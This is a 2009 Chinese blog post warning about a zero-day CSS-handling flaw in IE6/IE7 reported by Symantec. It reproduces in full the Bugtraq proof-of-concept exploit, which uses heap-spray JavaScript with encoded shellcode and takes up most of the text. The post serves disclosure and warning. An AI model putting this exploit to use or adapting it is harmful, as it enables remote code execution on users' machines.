# IE6-IE7 0day 漏洞
>date: 2009-11-23T00:52:14+08:00




昨天（2009年11月21日），Symantec发布了[IE的一个0day安全漏洞的消息](http://www.symantec.com/connect/blogs/zero-day-internet-explorer-exploit-published)。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6/IE7处理CSS时的一个漏洞（[关于IE和CSS的BUG](/2009/IE%E7%9A%84CSS%E7%9B%B8%E5%85%B3%E7%9A%84BUG.md)）。如果你目前还在使用IE6/IE7，那你现在可能是你升级的时候了，当然，有很多人说IE8是没有问题的，但我个人还是建议在补丁出来之前先使用Firefox或Chrome。


根据Symantec的的报告，他们在第一时间内测试了那个“Exploit Code”（攻击代码），根据测试结果表时，那个JavaScript的攻击代码并不是100%的可靠，而且很不可靠，但安全专家相信，100%完全可靠的“攻击代码”将会马上出现。这意味着，这段攻击代码会马上如潮水一样地放在各个有恶意的网站上，然后，所有的IE6/IE7的，打开JavaScript的用户都会被危及。


目前，这段攻击代码，虽然很不可靠，但已经被证明在IE6/IE7的 Windows XP SP3上是可靠的，目前还没有相关报告说明有多少台电脑中招了，但我相信，在过去的这个周末，一定有一些人在拼命地在改善这段攻击代码，他们要赶在相关的补丁出来之前。而Microsoft，相信他还是和以前一样，一定要等到攻击很广泛的时候才会开始真正把补丁提上日程。


最后，说一下攻击代码，这个代码是在[Bugtraq邮件组](http://seclists.org/bugtraq/2009/Nov/148)中，这段攻击代码如下所示，这段代码攻击性并不可靠。




```
<!--
securitylab.ir
K4mr4n_st () yahoo com
-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"<a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd</a>";>
<HTML xmlns=<a href="http://www.w3.org/1999/xhtml">http://www.w3.org/1999/xhtml</a>;>
    <HEAD>
<script>  
            function load(){
                var e;
                e=document.getElementsByTagName("STYLE")[0];
                e.outerHTML="1";
            }
        </script>    
        <STYLE type="text/css">
            body{ overflow: scroll; margin: 0; }
        </style>
       
        <SCRIPT language="javascript">
var shellcode =
unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
var bigblock = unescape("%u9090%u9090");
var headersize = 20;
var slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (x=0; x<4000; x++) memory[x] = block + shellcode;
</script>
 
    </HEAD>   
    <BODY onload="load()">
    </BODY>
</HTML>
```

 




